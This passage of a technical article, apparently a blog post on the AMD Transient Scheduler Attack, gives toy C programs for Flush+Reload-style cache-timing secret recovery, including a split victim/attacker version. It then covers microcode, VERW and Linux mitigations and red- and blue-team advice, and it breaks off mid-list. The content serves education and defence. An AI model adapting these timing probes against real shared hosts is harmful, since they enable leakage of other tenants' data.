    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-c">// 1. Initialize array to force allocation</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-c">// Attacker chooses a hint. For simplicity we fix it.</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x10</span>;

    <span class="pl-c">// 2. Flush the probe_array from cache</span>
    <span class="pl-en">flush_probe_array</span>();

    <span class="pl-c">// 3. Trigger victim many times to strengthen the signal</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-c">// 4. Measure timing for each possible index and find fastest</span>
    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (time = %u cycles)\\n"</span>, <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Recover an approximation of the secret</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>What’s happening here:</p>
<ul>
<li>The victim repeatedly touches <code>probe_array[(attacker_hint ^ secret) * STRIDE]</code>,</li>
<li>That specific cache line becomes hot,</li>
<li>The attacker times every index and infers which is fastest,</li>
<li>From that <code>best_idx</code>, it guesses <code>secret ≈ attacker_hint ^ best_idx</code>.</li>
</ul>
<p>This is the <strong>same mental structure</strong> as real microarchitectural leaks: you never read the secret directly; you watch how <strong>transient microarchitectural state changes timing</strong>.</p>
<p>On a modern CPU, you may need to run it multiple times, average results, or tweak <code>PROBE_SIZE</code> / <code>STRIDE</code> to get a clear signal.</p>
<div class="markdown-heading"><h3 class="heading-element">4.2 Variant without <code>rdtsc</code>: using <code>clock_gettime</code>
</h3><a id="user-content-42-variant-without-rdtsc-using-clock_gettime" class="anchor" aria-label="Permalink: 4.2 Variant without rdtsc: using clock_gettime" href="#42-variant-without-rdtsc-using-clock_gettime"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>If you want a version that doesn’t rely on <code>rdtsc</code> (e.g., on some systems it may be restricted or noisy), here’s a variant using <code>clock_gettime</code> with <code>CLOCK_MONOTONIC_RAW</code>. It’s less precise but more portable.</p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy_posix tsa_toy_posix.c</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;time.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x2A</span>;  <span class="pl-c">// 42 decimal</span>

<span class="pl-k">static</span> <span class="pl-k">inline</span> <span class="pl-smi">uint64_t</span> <span class="pl-en">nsec_now</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">struct</span> <span class="pl-smi">timespec</span> <span class="pl-s1">ts</span>;
    <span class="pl-en">clock_gettime</span>(<span class="pl-c1">CLOCK_MONOTONIC_RAW</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">ts</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint64_t</span>)<span class="pl-s1">ts</span>.<span class="pl-c1">tv_sec</span> <span class="pl-c1">*</span> <span class="pl-c1">1000000000ull</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span>.<span class="pl-c1">tv_nsec</span>;
}

<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-smi">uint64_t</span> <span class="pl-en">time_access_ns</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();

    <span class="pl-k">return</span> <span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>;
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x05</span>;

    <span class="pl-c">// Simple multiple trials to average timing</span>
    <span class="pl-k">const</span> <span class="pl-smi">int</span> <span class="pl-s1">trials</span> <span class="pl-c1">=</span> <span class="pl-c1">50</span>;

    <span class="pl-c">// prime+victim</span>
    <span class="pl-en">flush_probe_array</span>();
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT64_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">total</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;
        <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">trials</span>; <span class="pl-s1">t</span><span class="pl-c1">++</span>) {
            <span class="pl-s1">total</span> <span class="pl-c1">+=</span> <span class="pl-en">time_access_ns</span>(<span class="pl-s1">idx</span>);
        }
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">avg</span> <span class="pl-c1">=</span> <span class="pl-s1">total</span> / <span class="pl-s1">trials</span>;

        <span class="pl-k">if</span> (<span class="pl-s1">avg</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">avg</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (avg time = %llu ns)\\n"</span>,
           <span class="pl-s1">best_idx</span>, (<span class="pl-smi">unsigned long long</span>)<span class="pl-s1">best_time</span>);

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This looks similar to the timing setups in CPU side-channel courses and Spectre labs, where you average many samples to separate cache hits from misses.</p>
<div class="markdown-heading"><h3 class="heading-element">4.3 Splitting victim and attacker (two processes, shared memory)</h3><a id="user-content-43-splitting-victim-and-attacker-two-processes-shared-memory" class="anchor" aria-label="Permalink: 4.3 Splitting victim and attacker (two processes, shared memory)" href="#43-splitting-victim-and-attacker-two-processes-shared-memory"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>To make the lab feel more like a <strong>cross-process leak</strong> (closer to TSA’s “other context” threat model), you can separate victim and attacker into <strong>two processes</strong> that share memory via <code>shm_open</code> / <code>mmap</code>.</p>
<p><strong>Shared header:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// common.h</span>
<span class="pl-k">#pragma</span> once
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> {
    <span class="pl-smi">uint8_t</span> <span class="pl-c1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">stop</span>;      <span class="pl-c">// flag to tell victim to stop</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">ready</span>;     <span class="pl-c">// flag for simple sync</span>
};</pre></div>
<p><strong>Victim process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// victim.c</span>
<span class="pl-c">// gcc -O2 -march=native -o victim victim.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>

<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x7F</span>;

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span> | <span class="pl-c1">O_CREAT</span>, <span class="pl-c1">0600</span>);
    <span class="pl-en">ftruncate</span>(<span class="pl-s1">fd</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span>));
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Initialize</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span>) {
        <span class="pl-c">// attacker_hint could be communicated via shared memory too;</span>
        <span class="pl-c">// here we just fix it for simplicity</span>
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x11</span>;
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
        <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
        __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
    }

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p><strong>Attacker process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// attacker.c</span>
<span class="pl-c">// gcc -O2 -march=native -o attacker attacker.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span>, <span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned</span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span>, <span class="pl-c1">0600</span>);
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Wait for victim to init</span>
    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span>) { }

    <span class="pl-c">// Flush cache lines first</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }

    <span class="pl-c">// Give victim some time to run and "prime" one line</span>
    <span class="pl-en">usleep</span>(<span class="pl-c1">10000</span>);

    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">sh</span>, <span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index (cross-proc) = %d, time = %u cycles\\n"</span>,
           <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Tell victim to stop</span>
    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This is closer in spirit to <strong>“victim in one context, attacker in another”</strong>, even though they’re still on the same OS and sharing memory explicitly. Real TSA removes that explicit sharing: instead of a shared array, the “shared state” is the CPU’s internal scheduler, store queue, and L1 cache.</p>
<div class="markdown-heading"><h3 class="heading-element">4.4 Connecting the lab back to TSA</h3><a id="user-content-44-connecting-the-lab-back-to-tsa" class="anchor" aria-label="Permalink: 4.4 Connecting the lab back to TSA" href="#44-connecting-the-lab-back-to-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Right after these code sections, the key takeaway is:</p>
<ul>
<li>
<p>Our toy lab uses <strong>cache presence</strong> as the side-channel signal (classic Flush+Reload / Prime+Probe).</p>
</li>
<li>
<p>TSA uses <strong>scheduler timing</strong> as the side-channel signal:</p>
<ul>
<li>False completions → invalid data forwarded → different dependency chains → different timing.</li>
</ul>
</li>
<li>
<p>In both cases, the attacker:</p>
<ol>
<li>
<strong>Influences</strong> microarchitectural state (priming),</li>
<li>Lets a victim touch secret-dependent data (access pattern),</li>
<li>Measures a <strong>timing difference</strong> in its own code,</li>
<li>Reconstructs bits of the secret over many trials.</li>
</ol>
</li>
</ul>
<p>That’s the mental bridge you want readers to cross.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">5. Mitigations: what AMD, OSs, and clouds are doing</h2><a id="user-content-5-mitigations-what-amd-oss-and-clouds-are-doing" class="anchor" aria-label="Permalink: 5. Mitigations: what AMD, OSs, and clouds are doing" href="#5-mitigations-what-amd-oss-and-clouds-are-doing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA mitigations span firmware, OS, and virtualization layers.</p>
<div class="markdown-heading"><h3 class="heading-element">5.1 Microcode + VERW</h3><a id="user-content-51-microcode--verw" class="anchor" aria-label="Permalink: 5.1 Microcode + VERW" href="#51-microcode--verw"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD ships updated <strong>microcode</strong> for vulnerable Family 19h CPUs. On top of that, they recommend using the memory form of the <code>VERW</code> instruction as a “microarchitectural scrub”:</p>
<ul>
<li>New CPUID bits tell software:
<ul>
<li>Whether TSA-L1 / TSA-SQ are not present,</li>
<li>Whether the CPU supports TSA mitigation via <code>VERW_CLEAR</code>.</li>
</ul>
</li>
<li>With appropriate microcode loaded, <strong>CPL0 (kernel / hypervisor)</strong> can execute <code>VERW</code> to clear TSA-relevant structures when crossing trust boundaries, e.g.:
<ul>
<li>Kernel → user transitions,</li>
<li>Hypervisor → guest VM transitions,</li>
<li>Before entering low-power states.</li>
</ul>
</li>
</ul>
<p>This is similar in spirit to existing post-Spectre mitigations (IBPB, STIBP, etc.) but targeted at scheduler structures.</p>
<div class="markdown-heading"><h3 class="heading-element">5.2 Linux <code>MITIGATION_TSA</code> and <code>tsa=</code> knob</h3><a id="user-content-52-linux-mitigation_tsa-and-tsa-knob" class="anchor" aria-label="Permalink: 5.2 Linux MITIGATION_TSA and tsa= knob" href="#52-linux-mitigation_tsa-and-tsa-knob"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Linux added explicit support for TSA mitigations:</p>
<ul>
<li>A new Kconfig option <code>MITIGATION_TSA</code> gates TSA-related logic.</li>
<li>A boot parameter <code>tsa=</code> controls behavior (e.g., always on, only for user/kernel transitions, only guest/host transitions, or disabled).</li>
<li>Combined with updated microcode from <code>linux-firmware</code>, this lets distros tune performance vs security trade-offs depending on threat model.</li>
</ul>
<div class="markdown-heading"><h3 class="heading-element">5.3 SEV-SNP and attestation</h3><a id="user-content-53-sev-snp-and-attestation" class="anchor" aria-label="Permalink: 5.3 SEV-SNP and attestation" href="#53-sev-snp-and-attestation"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>For AMD’s <strong>SEV-SNP</strong> (encrypted VM) environments:</p>
<ul>
<li>TSA could, in principle, allow a malicious hypervisor to infer SEV-SNP guest data.</li>
<li>Microcode and firmware updates aim to automatically mitigate TSA for SEV-SNP guests.</li>
<li>Guest owners are expected to:
<ul>
<li>Verify via <strong>attestation</strong> that the host is running the right microcode,</li>
<li>Confirm that TSA mitigations are active before trusting the platform.</li>
</ul>
</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">6. What red teams and blue teams should actually do</h2><a id="user-content-6-what-red-teams-and-blue-teams-should-actually-do" class="anchor" aria-label="Permalink: 6. What red teams and blue teams should actually do" href="#6-what-red-teams-and-blue-teams-should-actually-do"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<div class="markdown-heading"><h3 class="heading-element">6.1 For red teams</h3><a id="user-content-61-for-red-teams" class="anchor" aria-label="Permalink: 6.1 For red teams" href="#61-for-red-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA probably won’t be your <strong>first</strong> move in a real engagement, but it’s worth understanding as part of a modern attack surface:</p>
<ul>
<li>
<strong>Model it as a capability</strong>:
<ul>
<li>“Given local code execution on a shared AMD Zen 3/4 host, I may be able to leak bits of privileged data over time.”</li>
</ul>
</li>
<li>
<strong>Think in campaigns, not single shots</strong>:
<ul>
<li>Meeting the timing conditions and noise requirements means you want long-lived footholds and repeated victim activity.</li>
</ul>
</li>
<li>
<strong>Use it to stress test cloud models</strong>:
<ul>
<li>Ask: “If I’m a rogue tenant on this EPYC host, what’s the maximum <em>theoretical</em> data I can extract from neighbors?”</li>
</ul>
</li>
</ul>
<p>TSA is a great hook for talks and blogs because it forces teams to think beyond “network perimeter” and even beyond “syscall boundary.” The CPU itself is part of the threat surface.</p>
<div class="markdown-heading"><h3 class="heading-element">6.2 For blue teams</h3><a id="user-content-62-for-blue-teams" class="anchor" aria-label="Permalink: 6.2 For blue teams" href="#62-for-blue-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Concrete actions:</p>
<ol>
<li>
<p><strong>Patch like this is Meltdown-class, not just ‘medium CVSS’</strong></p>
<ul>
<li>Make sure:
<ul>
